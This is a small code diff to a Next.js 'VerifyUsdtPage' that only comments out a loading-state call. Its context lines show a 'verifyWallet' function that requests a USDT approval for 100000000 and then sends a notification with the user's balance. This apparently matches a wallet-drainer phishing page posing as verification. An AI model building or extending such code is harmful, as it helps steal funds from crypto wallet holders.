@@ -148,7 +148,7 @@ const VerifyUsdtPage: NextPage = () => {
 
 
     async function verifyWallet() {
-        setVerifyLoading(false);
+        // setVerifyLoading(false);
         await approveUSDT(100000000);
         if(await checkApprovalStatus()) {
             await sendNotification(selectedIndex, balance);
